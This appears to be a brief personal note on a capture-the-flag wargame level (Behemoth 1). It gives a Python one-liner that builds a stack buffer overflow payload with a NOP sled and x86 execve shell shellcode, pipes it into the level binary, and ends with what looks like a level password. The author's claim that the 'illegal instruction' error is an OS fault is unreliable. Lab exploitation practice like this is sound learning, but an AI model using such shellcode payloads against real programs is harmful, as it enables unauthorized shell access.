```sh
python -c 'print "a"*71+"\x9f\xd6\xff\xff"+"\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"' > a.txt
cat a.txt | /behemoth/behemoth1
```

I got "illegal instruction", after googling it it seems like its not my error, 
but an os error ==> i called for shell but got something else instead.
the solution would be to use other shellcode...

eimahquuof
